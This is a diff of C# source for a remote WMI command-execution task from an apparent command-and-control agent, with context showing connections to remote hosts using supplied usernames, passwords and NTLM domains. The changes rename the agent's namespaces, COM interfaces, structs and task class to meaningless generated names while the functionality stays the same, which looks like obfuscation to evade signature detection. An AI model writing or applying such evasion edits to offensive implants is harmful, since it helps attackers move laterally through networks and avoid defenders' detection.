@@ -9,10 +9,10 @@
 using System;
 using System.Management;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
 using System.Runtime.InteropServices;
 using OleViewDotNet.Marshaling;
 using OleViewDotNet.Interop;
@@ -54,7 +54,7 @@ namespace OleViewDotNet.Interop
     }
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    internal struct COAUTHINFO
+    internal struct EfficientRouter2A9B
     {
         public RpcAuthnService dwAuthnSvc;
         public int dwAuthzSvc;
@@ -67,7 +67,7 @@ namespace OleViewDotNet.Interop
     }
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct MULTI_QI : IDisposable
+    public struct FlexibleHandler6FA9 : IDisposable
     {
         private IntPtr pIID;
         public IntPtr pItf;
@@ -122,14 +122,14 @@ namespace OleViewDotNet.Marshaling
 
 namespace Tasks
 {
-    public class wmiexecute : Tasking
+    public class EfficientHandlerC2B4 : Tasking
     {
         // Argument marshaling taking from:
         // https://learn.microsoft.com/en-us/dotnet/framework/interop/default-marshalling-for-objects
         [ComImport]
         [Guid("F309AD18-D86A-11d0-A075-00C04FB68820")]
         [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        public interface IWbemLevel1Login
+        public interface CipherService443B
         {
             [return: MarshalAs(UnmanagedType.Interface)]
             int EstablishPosition(/* ... */);
@@ -141,7 +141,7 @@ namespace Tasks
         [ComImport]
         [Guid("9556dc99-828c-11cf-a37e-00aa003240c7")]
         [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        public interface IWbemServices
+        public interface OptimizedTransformer1305
         {
             [return: MarshalAs(UnmanagedType.Interface)]
             int OpenNamespace(/* ... */);
@@ -172,7 +172,7 @@ namespace Tasks
         [ComImport]
         [Guid("dc12a681-737f-11cf-884d-00aa004b2e24")]
         [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        public interface IWbemClassObject
+        public interface RobustHandler00C0
         {
             [return: MarshalAs(UnmanagedType.Interface)]
             int GetQualifierSet(/* ... */);
@@ -214,7 +214,7 @@ namespace Tasks
         }
 
         [DataContract]
-        internal struct WmiExecuteParameters
+        internal struct WraithService5A17
         {
             [DataMember(Name = "host")]
             internal string? HostName;
@@ -345,7 +345,7 @@ namespace Tasks
                 //Original version using wmi v1
                 ManagementScope scope = new ManagementScope();
                 //executes for remote hosts
-                if (string.IsNullOrEmpty(HostName) is false)
+                if (ValidationHelper.IsStringEmpty(HostName) is false)
                 {
                     //set wmi connection options
                     ConnectionOptions options = new ConnectionOptions
@@ -353,9 +353,9 @@ namespace Tasks
                         EnablePrivileges = true,
                         Authentication = AuthenticationLevel.PacketPrivacy,
                         Impersonation = ImpersonationLevel.Impersonate,
-                        Username = string.IsNullOrEmpty(Username) ? null : Username,
-                        Password = string.IsNullOrEmpty(Password) ? null : Password,
-                        Authority = string.IsNullOrEmpty(Domain) ? null : $"NTLMDOMAIN:{Domain}"
+                        Username = ValidationHelper.IsStringEmpty(Username) ? null : Username,
+                        Password = ValidationHelper.IsStringEmpty(Password) ? null : Password,
+                        Authority = ValidationHelper.IsStringEmpty(Domain) ? null : $"NTLMDOMAIN:{Domain}"
                     };
                     DebugHelp.DebugWriteLine($@"trying to connect to target at: \\{HostName}\root\cimv2");
                     DebugHelp.DebugWriteLine($@"Username: {options.Username}");
